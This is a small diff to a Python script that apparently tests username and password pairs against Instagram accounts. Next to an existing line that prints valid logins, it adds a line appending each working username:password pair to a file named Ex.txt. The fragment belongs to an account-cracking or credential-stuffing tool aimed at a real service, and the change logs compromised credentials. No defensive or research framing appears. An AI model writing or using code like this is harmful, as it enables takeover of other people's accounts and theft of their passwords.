@@ -58,9 +58,13 @@ if raw == 2:
               urls = 'https://www.instagram.com/accounts/logout/'
               e = requests.get(urls)
               print(' USer : '+z+' Pass : '+iz)
+              opem = open('Ex.txt','a').write(z+' : '+iz+'\n')
           else:
               print(' NOOt > : '+z+' : '+iz)
 else:
     print('.........Error ')
           
 
+
+
+          
